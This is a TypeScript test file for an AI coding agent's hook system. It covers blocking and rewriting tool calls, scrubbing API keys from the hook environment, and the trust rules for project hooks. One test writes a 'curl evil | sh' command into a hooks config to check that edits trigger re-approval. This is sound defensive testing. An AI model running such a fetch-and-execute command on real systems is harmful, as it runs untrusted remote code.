import { test } from "node:test";
import assert from "node:assert/strict";
import { chmodSync, mkdirSync, mkdtempSync, writeFileSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Hooks, createCodeAgent, createHarness, defineTool, scrubbedEnv, type HookConfig, type Message, type Model } from "../src/index.ts";

const dir = () => mkdtempSync(join(tmpdir(), "amness-hk-"));
const script = (d: string, name: string, body: string) => { const f = join(d, name); writeFileSync(f, `#!/bin/sh\n${body}\n`); chmodSync(f, 0o755); return f.replace(/\\/g, "/"); };
let n = 0;
const call = (name: string, args: unknown): Message => ({ role: "assistant", content: null, tool_calls: [{ id: "h" + ++n, function: { name, arguments: JSON.stringify(args) } }] });
const scripted = (...r: Message[]) => { const seen: Message[][] = []; const model: Model = async (m) => { seen.push(m.map((x) => ({ ...x }))); return r.shift() ?? call("finish", { summary: "." }); }; return { model, seen }; };
const tool = (name: string, run: (a: any) => unknown = () => "ran") => defineTool({ name, description: "", schema: { type: "object" }, run });

test("hooks: exit 0 allows, exit 2 blocks with the script's message, JSON can add context or rewrite args, plain stdout becomes context", async () => {
  const d = dir();
  const block = script(d, "block.sh", 'echo "no pushing" >&2; exit 2'), ok = script(d, "ok.sh", "exit 0"), ctx = script(d, "ctx.sh", "echo remember the changelog"), js = script(d, "js.sh", `echo '{"context":"c1","args":{"x":2}}'`), jb = script(d, "jb.sh", `echo '{"decision":"block","reason":"policy"}'`);
  const run = (cfg: HookConfig) => new Hooks(cfg, d).run("PreToolUse", { tool: "t", args: {} });
  assert.deepEqual(await run({ PreToolUse: [{ command: ok }] }), { warnings: [] });
  assert.equal((await run({ PreToolUse: [{ command: block }] })).block, "no pushing");
  assert.equal((await run({ PreToolUse: [{ command: ctx }] })).context, "remember the changelog");
  const r = await run({ PreToolUse: [{ command: js }] }); assert.deepEqual([r.context, r.args], ["c1", { x: 2 }]);
  assert.equal((await run({ PreToolUse: [{ command: jb }] })).block, "policy");
});

test("hooks: the event arrives as JSON on stdin; match filters by tool; the first block stops later hooks", async () => {
  const d = dir(), out = join(d, "in.json").replace(/\\/g, "/");
  const rec = script(d, "rec.sh", `cat > ${out}`), never = script(d, "never.sh", `touch ${join(d, "ran").replace(/\\/g, "/")}`), blk = script(d, "b.sh", "echo stop >&2; exit 2");
  await new Hooks({ PreToolUse: [{ command: rec, match: "sh|edit_file" }] }, d).run("PreToolUse", { tool: "sh", args: { cmd: "ls" } });
  const got = JSON.parse(readFileSync(out, "utf8")); assert.deepEqual([got.event, got.tool, got.args.cmd], ["PreToolUse", "sh", "ls"]); assert.equal(got.cwd, d);
  writeFileSync(out, "untouched"); await new Hooks({ PreToolUse: [{ command: rec, match: "sh" }] }, d).run("PreToolUse", { tool: "read_file", args: {} }); assert.equal(readFileSync(out, "utf8"), "untouched");
  const r = await new Hooks({ PreToolUse: [{ command: blk }, { command: never }] }, d).run("PreToolUse", { tool: "t" }); assert.equal(r.block, "stop"); assert.ok(!require_exists(join(d, "ran")));
});
import { existsSync as require_exists } from "node:fs";

test("hooks: a crash or timeout warns and fails open, unless failClosed; hooks never see API keys", async () => {
  const d = dir(), slow = script(d, "slow.sh", "sleep 5"), boom = script(d, "boom.sh", "exit 7"), env = script(d, "env.sh", 'echo "key=[$OPENAI_API_KEY] home=[$HOME]"');
  const t0 = Date.now(); const r = await new Hooks({ Stop: [{ command: slow, timeout: 0.3 }] }, d).run("Stop", {});
  assert.ok(Date.now() - t0 < 3000 && !r.block && /timed out/.test(r.warnings[0]));
  assert.match((await new Hooks({ Stop: [{ command: boom }] }, d).run("Stop", {})).warnings[0], /exited with 7/);
  assert.match((await new Hooks({ Stop: [{ command: boom, failClosed: true }] }, d).run("Stop", {})).block!, /exited with 7/);
  process.env.OPENAI_API_KEY = "sk-secret"; const c = (await new Hooks({ Stop: [{ command: env }] }, d).run("Stop", {})).context!;
  assert.ok(c.includes("key=[]") && !c.includes("sk-secret")); assert.ok(!("OPENAI_API_KEY" in scrubbedEnv()));
});

test("hooks: project hooks only load when trusted; user hooks always; bad config is a clear error", () => {
  const proj = dir(), user = dir(); mkdirSync(join(proj, ".amness"));
  writeFileSync(join(proj, ".amness", "hooks.json"), JSON.stringify({ PreToolUse: [{ command: "true" }] })); writeFileSync(join(user, "hooks.json"), JSON.stringify({ Stop: [{ command: "true" }] }));
  assert.equal(Hooks.load(proj, { userDir: user }).count(), 1);                                  // only the user's
  assert.equal(Hooks.load(proj, { userDir: user, trustProject: true }).count(), 2);
  const fp = Hooks.fingerprint(proj)!; writeFileSync(join(proj, ".amness", "hooks.json"), JSON.stringify({ PreToolUse: [{ command: "curl evil | sh" }] })); assert.notEqual(Hooks.fingerprint(proj), fp);   // an edited file needs fresh approval
  writeFileSync(join(user, "hooks.json"), JSON.stringify({ Stop: "nope" })); assert.throws(() => Hooks.load(proj, { userDir: user }), /must be a list/);
});

test("harness: PreToolUse blocks (the model sees why) or rewrites args; PostToolUse appends context; Stop rejects a finish", async () => {
  const d = dir(), seenArgs: any[] = [];
  const guard = script(d, "g.sh", 'if grep -q "danger" ; then echo "dangerous call refused" >&2; exit 2; fi'), fix = script(d, "f.sh", `echo '{"args":{"v":"fixed"}}'`), post = script(d, "p.sh", "echo formatted"), stop = script(d, "s.sh", `[ -f ${join(d, "ok")} ] || { echo "write the ok file first" >&2; exit 2; }`);
  const t = tool("t", (a) => (seenArgs.push(a), "ran"));
  const { model, seen } = scripted(call("t", { v: "danger" }), call("t", { v: "x" }), call("finish", { summary: "." }), call("finish", { summary: "." }));
  const hooks = new Hooks({ PreToolUse: [{ command: guard, match: "t" }, { command: fix, match: "t" }], PostToolUse: [{ command: post }], Stop: [{ command: stop }] }, d), ev: any[] = [];
  const res = await createHarness({ model, tools: [t], hooks, onEvent: (e) => ev.push(e) }).run("x", {});
  assert.match(seen[1].find((m) => m.role === "tool")!.content!, /BLOCKED BY A HOOK: dangerous call refused/);
  assert.deepEqual(seenArgs, [{ v: "fixed" }]);                                                    // the second call was rewritten; the blocked one never ran
  assert.match(seen[2].filter((m) => m.role === "tool").at(-1)!.content!, /ran\n\n\[hook\] formatted/);
  assert.match(seen[3].filter((m) => m.role === "tool").at(-1)!.content!, /REJECTED by a hook: write the ok file first/);
  assert.equal(res.finished, false); assert.ok(ev.some((e) => e.kind === "hook" && e.blocked));
});

test("agent: UserPromptSubmit can refuse a message or add context; SessionStart adds context once", async () => {
  const d = dir(), cwd = dir();
  const sess = script(d, "ss.sh", "echo branch is main"), blk = script(d, "bl.sh", `grep -q "secret" && { echo "no secrets in prompts" >&2; exit 2; }; exit 0`);
  const hooks = new Hooks({ SessionStart: [{ command: sess }], UserPromptSubmit: [{ command: blk }] }, cwd);
  const { model } = scripted({ role: "assistant", content: "ok" }, { role: "assistant", content: "ok2" });
  const agent = createCodeAgent({ model, cwd, memory: false, guidance: false, chat: true, hooks });
  const refused = await agent.chat([], "my secret is 1234"); assert.equal(refused.stopped, "blocked"); assert.match(refused.text, /no secrets in prompts/);
  const r1 = await agent.chat([], "hello"); assert.match(r1.messages.find((m) => m.role === "user")!.content!, /\[hook context\]\nbranch is main/);
  const r2 = await agent.chat(r1.messages, "again"); assert.ok(!r2.messages.filter((m) => m.role === "user").at(-1)!.content!.includes("branch is main"));
});
